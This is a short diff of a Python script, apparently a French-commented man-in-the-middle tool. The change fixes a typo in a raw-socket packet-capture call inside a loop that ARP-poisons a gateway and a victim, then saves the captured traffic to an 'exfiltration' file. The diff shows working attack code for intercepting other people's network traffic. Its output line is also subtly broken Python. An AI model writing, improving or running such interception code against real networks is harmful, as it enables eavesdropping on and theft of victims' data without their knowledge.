@@ -137,7 +137,7 @@ def mitm(): # fonction man in the middle
 			trick(gateMAC, victimMAC)
 			time.sleep(1.5)
 			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-			print s.rcvfrom(655565) >> '/exfiltration/capt_reseau.txt'
+			print s.recvfrom(655565) >> '/exfiltration/capt_reseau.txt'
 		except KeyboardInterrupt:
 			reARP()
 			break
